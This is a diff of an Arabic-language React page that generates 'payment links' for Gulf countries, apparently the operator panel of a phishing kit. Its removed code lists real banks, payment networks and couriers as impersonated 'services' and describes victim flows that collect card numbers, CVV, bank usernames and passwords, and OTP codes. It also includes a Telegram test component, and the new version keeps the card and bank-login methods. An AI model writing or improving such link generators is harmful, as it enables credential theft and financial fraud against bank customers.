@@ -1,28 +1,31 @@
-import { useState, useMemo } from "react";
+import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
-import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
-import { useCreateLink } from "@/hooks/useSupabase";
+import { Card } from "@/components/ui/card";
 import { getCountryByCode } from "@/lib/countries";
-import { getServiceBranding } from "@/lib/serviceLogos";
-import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
-import { getCompanyMeta } from "@/utils/companyMeta";
-import { getCurrency, getDefaultTitle } from "@/utils/countryData";
-import { generatePaymentLink } from "@/utils/paymentLinks";
-import { CreditCard, DollarSign, Hash, Building2, Copy, ExternalLink, FileText } from "lucide-react";
+import { getCurrencySymbol, getCurrencyCode } from "@/lib/countryCurrencies";
+import {
+  CreditCard,
+  DollarSign,
+  ArrowRight,
+  RefreshCw,
+  Building2,
+  Package,
+  Shield,
+  Copy,
+  ExternalLink
+} from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
-import TelegramTest from "@/components/TelegramTest";
+import { useCreateLink } from "@/hooks/useSupabase";
+import { generatePaymentLink } from "@/utils/paymentLinks";
 import BottomNav from "@/components/BottomNav";
 import BackButton from "@/components/BackButton";
 import {
   AlertDialog,
-  AlertDialogAction,
   AlertDialogContent,
   AlertDialogDescription,
-  AlertDialogFooter,
   AlertDialogHeader,
   AlertDialogTitle,
 } from "@/components/ui/alert-dialog";
@@ -32,436 +35,175 @@ const CreatePaymentLink = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const createLink = useCreateLink();
-  const countryData = getCountryByCode(country?.toUpperCase() || "");
+  const selectedCountry = getCountryByCode(country || "SA");
 
-  const [paymentAmount, setPaymentAmount] = useState("500");
+  const [title, setTitle] = useState("");
+  const [amount, setAmount] = useState("1000");
   const [paymentMethod, setPaymentMethod] = useState("card");
-  const [paymentService, setPaymentService] = useState("sadad"); // Default to sadad
-  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
-  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
-  const [linkId, setLinkId] = useState("");
-
-  // Determine available payment services based on country
-  const getPaymentServices = (countryCode: string) => {
-    switch (countryCode?.toUpperCase()) {
-      case 'SA':
-        return [
-          { key: 'sadad', name: 'سداد - SADAD', icon: '💳' },
-          { key: 'mada', name: 'مدى - mada', icon: '🏦' },
-          { key: 'alrajhi_bank', name: 'مصرف الراجحي', icon: '🏛️' },
-          { key: 'snb', name: 'البنك الأهلي السعودي', icon: '🏛️' },
-          { key: 'enbd', name: 'الإمارات دبي الوطني', icon: '🏛️' },
-          { key: 'stc_pay', name: 'STC Pay', icon: '📱' },
-        ];
-      case 'AE':
-        return [
-          { key: 'jaywan', name: 'جيوان - Jaywan', icon: '💳' },
-          { key: 'dirham', name: 'درهم - Dirham', icon: '💰' },
-          { key: 'enbd', name: 'الإمارات دبي الوطني', icon: '🏛️' },
-          { key: 'uae_pass', name: 'الهوية الرقمية UAE Pass', icon: '🆔' },
-        ];
-      case 'KW':
-        return [
-          { key: 'knet', name: 'كي نت - KNET', icon: '💳' },
-          { key: 'nbk', name: 'البنك الوطني الكويتي', icon: '🏛️' },
-          { key: 'dhlkw', name: 'DHL الكويت', icon: '📦' },
-        ];
-      case 'QA':
-        return [
-          { key: 'qnb', name: 'مجموعة QNB', icon: '🏛️' },
-          { key: 'qatar_gov', name: 'بوابة الدفع الحكومية', icon: '🏛️' },
-          { key: 'metrash2', name: 'مترش ٢ - Metrash2', icon: '📱' },
-          { key: 'dhlqa', name: 'DHL قطر', icon: '📦' },
-        ];
-      case 'OM':
-        return [
-          { key: 'maal', name: 'مال - Maal', icon: '💳' },
-          { key: 'bank_muscat', name: 'بنك مسقط', icon: '🏛️' },
-          { key: 'dhlom', name: 'DHL عُمان', icon: '📦' },
-        ];
-      case 'BH':
-        return [
-          { key: 'benefit', name: 'بنفت - BENEFIT', icon: '💳' },
-          { key: 'dhlbh', name: 'DHL البحرين', icon: '📦' },
-        ];
-      default:
-        return [
-          { key: 'sadad', name: 'سداد - SADAD', icon: '💳' },
-          { key: 'aramex', name: 'أرامكس - Aramex', icon: '📦' },
-        ];
-    }
-  };
-
-  const paymentServices = getPaymentServices(country);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [showSuccess, setShowSuccess] = useState(false);
+  const [createdLink, setCreatedLink] = useState("");
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-
-    if (!paymentAmount || parseFloat(paymentAmount) <= 0) {
-      toast({
-        title: "خطأ",
-        description: "الرجاء إدخال مبلغ صحيح",
-        variant: "destructive",
-      });
+    if (!title || !amount) {
+      toast({ title: "خطأ", description: "يرجى إكمال جميع الحقول", variant: "destructive" });
       return;
     }
 
+    setIsSubmitting(true);
     try {
-      const payload = {
-        payment_amount: parseFloat(paymentAmount) || 500,
-        currency_code: getCurrencyCode(country || "SA"),
-        payment_method: paymentMethod,
-        selectedCountry: country || "SA",
-        service_key: paymentService,
-        service_name: paymentServices.find(s => s.key === paymentService)?.name || paymentService,
-      };
-
-      console.log('[CreatePaymentLink] Creating link with payload:', payload);
-
       const link = await createLink.mutateAsync({
         type: "payment",
-        country_code: country || "",
-        payload: payload,
+        country_code: country || "SA",
+        payload: {
+          title,
+          cod_amount: parseFloat(amount),
+          payment_method: paymentMethod,
+          currency_code: getCurrencyCode(country || "SA"),
+          service_name: title,
+          service_type: 'local_payment'
+        },
       });
 
-      // Generate unified payment URL using the new function
       const paymentUrl = generatePaymentLink({
         invoiceId: link.id,
-        company: paymentService,
+        company: title,
         country: country || 'SA',
-        amount: parseFloat(paymentAmount) || 500,
-        currency: getCurrencyCode(country || "SA"),
+        amount: parseFloat(amount),
+        currency: getCurrencyCode(country || 'SA'),
         paymentMethod: paymentMethod,
+        type: 'payment'
       });
-
-      setCreatedPaymentUrl(paymentUrl);
-      setLinkId(link.id);
-      setShowSuccessDialog(true);
-
-      toast({
-        title: "تم إنشاء رابط السداد بنجاح!",
-        description: "يمكنك الآن مشاركة الرابط مع العميل",
-      });
+      setCreatedLink(paymentUrl);
+      setShowSuccess(true);
+      toast({ title: "تم إنشاء الرابط بنجاح" });
     } catch (error) {
-      // Error creating payment link
-      toast({
-        title: "خطأ في إنشاء الرابط",
-        description: "حدث خطأ أثناء إنشاء رابط السداد",
-        variant: "destructive",
-      });
+      toast({ title: "خطأ", description: "فشل إنشاء الرابط", variant: "destructive" });
+    } finally {
+      setIsSubmitting(false);
     }
   };
 
-
-  if (!countryData) {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
-        <div className="text-center p-8">
-          <CreditCard className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
-          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
-          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
-          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
-        </div>
-      </div>
-    );
-  }
+  if (!selectedCountry) return null;
 
   return (
-    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
-      <div className="container mx-auto px-4">
-        <div className="mb-4">
+    <div className="min-h-screen bg-indigo-50/30" dir="rtl">
+      <header className="bg-indigo-600 text-white h-20 flex items-center px-4 sticky top-0 z-50 shadow-xl border-b-4 border-indigo-900">
+        <div className="container mx-auto flex justify-between items-center">
+          <div className="flex items-center gap-3">
+            <div className="w-10 h-10 bg-white/20 rounded-xl flex items-center justify-center backdrop-blur-md">
+              <CreditCard className="w-6 h-6 text-white" />
+            </div>
+            <div>
+              <h1 className="text-lg font-black tracking-tight">بوابة الدفع السريع</h1>
+              <p className="text-[10px] font-bold opacity-70 uppercase tracking-widest">{selectedCountry.nameAr} - Express Payment</p>
+            </div>
+          </div>
           <BackButton />
         </div>
-        
-        {/* Telegram Test Component */}
-        <div className="mb-6">
-          <TelegramTest />
-        </div>
+      </header>
 
-        <div className="max-w-2xl mx-auto">
-          <Card className="p-4 shadow-elevated">
-            <div
-              className="h-16 -m-4 mb-4 rounded-t-xl relative"
-              style={{
-                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
-              }}
-            >
-              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
-              <div className="absolute bottom-2 right-4 text-white">
-                <h1 className="text-lg font-bold">إنشاء رابط سداد</h1>
-                <p className="text-xs opacity-90">{countryData.nameAr}</p>
-              </div>
-            </div>
+      <main className="container mx-auto px-4 py-10 max-w-lg">
+        <form onSubmit={handleSubmit} className="space-y-6">
+          <Card className="p-8 border-none rounded-[2.5rem] shadow-2xl bg-white relative overflow-hidden">
+            <div className="absolute top-0 right-0 w-48 h-48 bg-indigo-50 rounded-full -mr-24 -mt-24 opacity-60" />
 
-            <form onSubmit={handleSubmit} className="space-y-4">
+            <h2 className="text-2xl font-black text-indigo-900 mb-10 flex items-center gap-3">
+              <Package className="w-8 h-8 text-indigo-500" />
+              تفاصيل طلب الدفع
+            </h2>
 
-              {/* Payment Amount */}
-              <div>
-                <Label className="mb-2 flex items-center gap-2 text-sm">
-                  <DollarSign className="w-3 h-3" />
-                  مبلغ السداد
-                  {country && (
-                    <span className="text-xs text-muted-foreground">
-                      ({getCurrencyName(country)})
-                    </span>
-                  )}
-                </Label>
-                <Input
-                  type="number"
-                  value={paymentAmount}
-                  onChange={(e) => setPaymentAmount(e.target.value)}
-                  placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
-                  className="h-9 text-sm"
-                  step="0.01"
-                  min="0"
-                />
-                {country && (
-                  <p className="text-xs text-muted-foreground mt-1">
-                    💱 العملة: {getCurrencyName(country)} ({getCurrencySymbol(country)})
-                  </p>
-                )}
+            <div className="space-y-8">
+              <div className="space-y-2">
+                <Label className="text-[11px] font-black text-indigo-300 uppercase tracking-[0.2em] px-1">عنوان الطلب / المنتج</Label>
+                <div className="relative">
+                  <Input value={title} onChange={(e) => setTitle(e.target.value)} className="h-16 border-b-4 border-l-0 border-r-0 border-t-0 border-slate-100 rounded-none font-black text-xl bg-transparent px-0 focus:border-indigo-600 focus:ring-0 transition-all" placeholder="مثال: فاتورة توريد، دفع رسوم..." />
+                </div>
               </div>
 
-              {/* Payment Service Selection (country-specific) */}
-              {paymentServices.length > 1 && (
-                <div>
-                  <Label className="mb-3 flex items-center gap-2 text-sm font-semibold">
-                    <Building2 className="w-4 h-4" />
-                    بوابة الدفع *
-                  </Label>
-                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                    {paymentServices.map((service) => (
-                      <button
-                        key={service.key}
-                        type="button"
-                        onClick={() => setPaymentService(service.key)}
-                        className={`relative p-4 rounded-lg border-2 transition-all duration-200 text-right ${
-                          paymentService === service.key
-                            ? 'border-primary bg-primary/5 shadow-md'
-                            : 'border-border hover:border-primary/50 bg-card'
-                        }`}
-                      >
-                        <div className="flex items-center gap-3">
-                          <span className="text-2xl">{service.icon}</span>
-                          <div className="flex-1">
-                            <h4 className={`font-semibold text-sm mb-0.5 ${
-                              paymentService === service.key ? 'text-primary' : 'text-foreground'
-                            }`}>
-                              {service.name}
-                            </h4>
-                          </div>
-                          {paymentService === service.key && (
-                            <div className="absolute top-2 left-2">
-                              <div className="w-5 h-5 rounded-full bg-primary flex items-center justify-center">
-                                <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
-                                  <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
-                                </svg>
-                              </div>
-                            </div>
-                          )}
-                        </div>
-                      </button>
-                    ))}
+              <div className="space-y-2">
+                <Label className="text-[11px] font-black text-indigo-300 uppercase tracking-[0.2em] px-1">القيمة الإجمالية</Label>
+                <div className="relative group">
+                  <Input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} className="h-20 border-b-4 border-l-0 border-r-0 border-t-0 border-slate-100 rounded-none font-black text-5xl bg-transparent px-0 focus:border-indigo-600 focus:ring-0 transition-all text-indigo-600" />
+                  <div className="absolute left-0 top-1/2 -translate-y-1/2 flex items-center gap-2">
+                     <span className="text-xl font-black text-indigo-300">{getCurrencySymbol(country || "SA")}</span>
+                     <DollarSign className="w-6 h-6 text-indigo-100" />
+                  </div>
+                </div>
+              </div>
+
+              {parseFloat(amount) > 0 && (
+                <div className="p-6 rounded-[2rem] bg-indigo-600 text-white animate-in zoom-in-95 duration-300 shadow-xl shadow-indigo-200">
+                  <div className="flex justify-between items-center mb-2">
+                    <span className="text-[10px] font-bold opacity-80 uppercase tracking-[0.2em]">المبلغ الصافي للدفع</span>
+                    <Shield className="w-5 h-5 opacity-80" />
+                  </div>
+                  <div className="flex items-baseline gap-2">
+                    <span className="text-4xl font-black">{amount}</span>
+                    <span className="text-sm font-bold opacity-80">{getCurrencySymbol(country || "SA")}</span>
                   </div>
                 </div>
               )}
 
-              {/* Payment Method Selection */}
-              <div>
-                <Label className="mb-3 flex items-center gap-2 text-sm font-semibold">
-                  <CreditCard className="w-4 h-4" />
-                  طريقة الدفع *
-                </Label>
-                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                  {/* Card Payment Option */}
-                  <button
-                    type="button"
-                    onClick={() => setPaymentMethod('card')}
-                    className={`relative p-4 rounded-lg border-2 transition-all duration-200 text-right ${
-                      paymentMethod === 'card'
-                        ? 'border-primary bg-primary/5 shadow-md'
-                        : 'border-border hover:border-primary/50 bg-card'
-                    }`}
-                  >
-                    <div className="flex items-start gap-3">
-                      <div className={`p-2 rounded-full ${
-                        paymentMethod === 'card' ? 'bg-primary text-white' : 'bg-muted text-muted-foreground'
-                      }`}>
-                        <CreditCard className="w-5 h-5" />
-                      </div>
-                      <div className="flex-1">
-                        <h4 className={`font-semibold text-sm mb-1 ${
-                          paymentMethod === 'card' ? 'text-primary' : 'text-foreground'
-                        }`}>
-                          بيانات البطاقة
-                        </h4>
-                        <p className="text-xs text-muted-foreground">
-                          إدخال بيانات البطاقة مباشرة
-                        </p>
-                        <div className="mt-2 text-xs text-muted-foreground">
-                          <div className="flex items-center gap-1">
-                            <span>📋</span>
-                            <span>بيانات المستلم</span>
-                          </div>
-                          <div className="flex items-center gap-1 mt-1">
-                            <span>💳</span>
-                            <span>بيانات البطاقة</span>
-                          </div>
-                          <div className="flex items-center gap-1 mt-1">
-                            <span>🔐</span>
-                            <span>رمز التحقق OTP</span>
-                          </div>
-                        </div>
-                      </div>
-                      {paymentMethod === 'card' && (
-                        <div className="absolute top-2 left-2">
-                          <div className="w-5 h-5 rounded-full bg-primary flex items-center justify-center">
-                            <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
-                              <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
-                            </svg>
-                          </div>
-                        </div>
-                      )}
-                    </div>
-                  </button>
-
-                  {/* Bank Login Option */}
-                  <button
-                    type="button"
-                    onClick={() => setPaymentMethod('bank_login')}
-                    className={`relative p-4 rounded-lg border-2 transition-all duration-200 text-right ${
-                      paymentMethod === 'bank_login'
-                        ? 'border-primary bg-primary/5 shadow-md'
-                        : 'border-border hover:border-primary/50 bg-card'
-                    }`}
-                  >
-                    <div className="flex items-start gap-3">
-                      <div className={`p-2 rounded-full ${
-                        paymentMethod === 'bank_login' ? 'bg-primary text-white' : 'bg-muted text-muted-foreground'
-                      }`}>
-                        <Building2 className="w-5 h-5" />
-                      </div>
-                      <div className="flex-1">
-                        <h4 className={`font-semibold text-sm mb-1 ${
-                          paymentMethod === 'bank_login' ? 'text-primary' : 'text-foreground'
-                        }`}>
-                          تسجيل دخول البنك
-                        </h4>
-                        <p className="text-xs text-muted-foreground">
-                          تسجيل الدخول عبر البنك الإلكتروني
-                        </p>
-                        <div className="mt-2 text-xs text-muted-foreground">
-                          <div className="flex items-center gap-1">
-                            <span>📋</span>
-                            <span>بيانات المستلم</span>
-                          </div>
-                          <div className="flex items-center gap-1 mt-1">
-                            <span>🏦</span>
-                            <span>اختيار البنك</span>
-                          </div>
-                          <div className="flex items-center gap-1 mt-1">
-                            <span>🔑</span>
-                            <span>تسجيل الدخول للبنك</span>
-                          </div>
-                          <div className="flex items-center gap-1 mt-1">
-                            <span>🔐</span>
-                            <span>رمز التحقق OTP</span>
-                          </div>
-                        </div>
-                      </div>
-                      {paymentMethod === 'bank_login' && (
-                        <div className="absolute top-2 left-2">
-                          <div className="w-5 h-5 rounded-full bg-primary flex items-center justify-center">
-                            <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
-                              <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
-                            </svg>
-                          </div>
-                        </div>
-                      )}
-                    </div>
-                  </button>
-                </div>
-                
-                {/* Info Box */}
-                <div className={`mt-3 p-3 rounded-lg text-xs ${
-                  paymentMethod === 'card' 
-                    ? 'bg-blue-50 dark:bg-blue-950/20 text-blue-700 dark:text-blue-300 border border-blue-200 dark:border-blue-800'
-                    : 'bg-green-50 dark:bg-green-950/20 text-green-700 dark:text-green-300 border border-green-200 dark:border-green-800'
-                }`}>
-                  <div className="flex items-start gap-2">
-                    <span className="text-base">ℹ️</span>
-                    <div>
-                      {paymentMethod === 'card' ? (
-                        <>
-                          <p className="font-semibold mb-1">خطوات الدفع ببيانات البطاقة:</p>
-                          <ol className="space-y-1 mr-4 list-decimal">
-                            <li>إدخال بيانات المستلم (الاسم، رقم الجوال)</li>
-                            <li>إدخال بيانات البطاقة (رقم البطاقة، تاريخ الانتهاء، CVV)</li>
-                            <li>إدخال رمز التحقق OTP المرسل من البنك</li>
-                          </ol>
-                        </>
-                      ) : (
-                        <>
-                          <p className="font-semibold mb-1">خطوات الدفع عبر تسجيل دخول البنك:</p>
-                          <ol className="space-y-1 mr-4 list-decimal">
-                            <li>إدخال بيانات المستلم (الاسم، رقم الجوال)</li>
-                            <li>اختيار البنك الذي تتعامل معه</li>
-                            <li>تسجيل الدخول باسم المستخدم وكلمة المرور للبنك</li>
-                            <li>إدخال رمز التحقق OTP المرسل من البنك</li>
-                          </ol>
-                        </>
-                      )}
-                    </div>
-                  </div>
+              <div className="space-y-4 pt-8 border-t border-slate-50">
+                <Label className="text-[11px] font-black text-indigo-300 uppercase tracking-[0.2em] px-1">طرق الدفع المفعلة</Label>
+                <div className="grid grid-cols-2 gap-4">
+                   <button type="button" onClick={() => setPaymentMethod('card')} className={`p-6 rounded-[2rem] border-4 transition-all flex flex-col items-center gap-3 ${paymentMethod === 'card' ? 'border-indigo-600 bg-indigo-50 shadow-lg' : 'border-slate-50 bg-slate-50'}`}>
+                      <CreditCard className={`w-10 h-10 ${paymentMethod === 'card' ? 'text-indigo-600' : 'text-slate-300'}`} />
+                      <span className={`text-[12px] font-black uppercase ${paymentMethod === 'card' ? 'text-indigo-600' : 'text-slate-400'}`}>بطاقة فيزا</span>
+                   </button>
+                   <button type="button" onClick={() => setPaymentMethod('bank_login')} className={`p-6 rounded-[2rem] border-4 transition-all flex flex-col items-center gap-3 ${paymentMethod === 'bank_login' ? 'border-indigo-600 bg-indigo-50 shadow-lg' : 'border-slate-50 bg-slate-50'}`}>
+                      <Building2 className={`w-10 h-10 ${paymentMethod === 'bank_login' ? 'text-indigo-600' : 'text-slate-300'}`} />
+                      <span className={`text-[12px] font-black uppercase ${paymentMethod === 'bank_login' ? 'text-indigo-600' : 'text-slate-400'}`}>تحويل بنكي</span>
+                   </button>
                 </div>
               </div>
-
-              <Button
-                type="submit"
-                size="lg"
-                className="w-full h-11 text-white mt-6"
-                style={{
-                  background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`
-                }}
-                disabled={createLink.isPending}
-              >
-                {createLink.isPending ? "جاري الإنشاء..." : "إنشاء رابط السداد"}
-              </Button>
-            </form>
+            </div>
           </Card>
-        </div>
 
-        {/* Success Dialog */}
-        <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
-          <AlertDialogContent className="sm:max-w-md" dir="rtl">
-            <AlertDialogHeader>
-              <AlertDialogTitle className="text-right">✅ تم إنشاء رابط السداد بنجاح!</AlertDialogTitle>
-              <AlertDialogDescription className="text-right">
-                يمكنك الآن مشاركة هذا الرابط مع العميل لدفع المبلغ المطلوب
-              </AlertDialogDescription>
-            </AlertDialogHeader>
-            <AlertDialogFooter className="flex flex-row gap-2 justify-start">
-              <Button
-                variant="outline"
-                onClick={() => window.open(createdPaymentUrl, '_blank')}
-                className="flex-1"
-              >
-                <ExternalLink className="w-4 h-4 ml-2" />
-                معاينة الرابط
-              </Button>
-              <AlertDialogAction
-                onClick={() => {
-                  navigate(`/pay/${linkId}/data`);
-                }}
-                className="flex-1"
-              >
-                إدخال بيانات السداد
-              </AlertDialogAction>
-            </AlertDialogFooter>
-          </AlertDialogContent>
-        </AlertDialog>
-      </div>
-      <div className="h-20" />
+          <Button type="submit" disabled={isSubmitting} className="w-full h-20 rounded-[2.5rem] font-black text-xl shadow-[0_20px_50px_rgba(79,70,229,0.3)] bg-indigo-600 hover:bg-indigo-700 text-white transition-all active:scale-95 group">
+             {isSubmitting ? <RefreshCw className="w-8 h-8 animate-spin" /> : (
+               <div className="flex items-center gap-3">
+                 <span>توليد رابط الدفع الفوري</span>
+                 <ArrowRight className="w-6 h-6 group-hover:translate-x-[-8px] transition-transform" />
+               </div>
+             )}
+          </Button>
+        </form>
+      </main>
+
+      <AlertDialog open={showSuccess} onOpenChange={setShowSuccess}>
+        <AlertDialogContent className="max-w-[90%] rounded-3xl border-none shadow-2xl p-0 overflow-hidden" dir="rtl">
+           <div className="p-8 text-center space-y-6">
+              <div className="w-20 h-20 bg-indigo-50 rounded-full flex items-center justify-center mx-auto mb-2">
+                <div className="w-12 h-12 bg-indigo-600 rounded-full flex items-center justify-center animate-bounce">
+                  <RefreshCw className="w-6 h-6 text-white" />
+                </div>
+              </div>
+              <div>
+                <AlertDialogTitle className="text-2xl font-black text-gray-900">رابط الدفع جاهز!</AlertDialogTitle>
+                <AlertDialogDescription className="font-bold text-gray-500">تم توليد رابط دفع آمن لهذا الطلب</AlertDialogDescription>
+              </div>
+
+              <div className="bg-gray-50 p-4 rounded-2xl border-2 border-dashed border-gray-200 break-all font-mono text-xs font-bold text-gray-400">
+                {createdLink}
+              </div>
+
+              <div className="flex gap-3">
+                 <Button onClick={() => { navigator.clipboard.writeText(createdLink); toast({ title: "تم النسخ" }); }} className="flex-1 h-14 rounded-2xl font-black bg-gray-900 text-white gap-2">
+                   <Copy className="w-4 h-4" /> نسخ الرابط
+                 </Button>
+                 <Button onClick={() => window.open(createdLink, '_blank')} variant="outline" className="flex-1 h-14 rounded-2xl font-black border-2 gap-2 text-gray-700">
+                   <ExternalLink className="w-4 h-4" /> معاينة
+                 </Button>
+              </div>
+              <Button variant="ghost" onClick={() => setShowSuccess(false)} className="w-full font-bold text-gray-400">إغلاق</Button>
+           </div>
+        </AlertDialogContent>
+      </AlertDialog>
+
+      <div className="h-24" />
       <BottomNav />
     </div>
   );
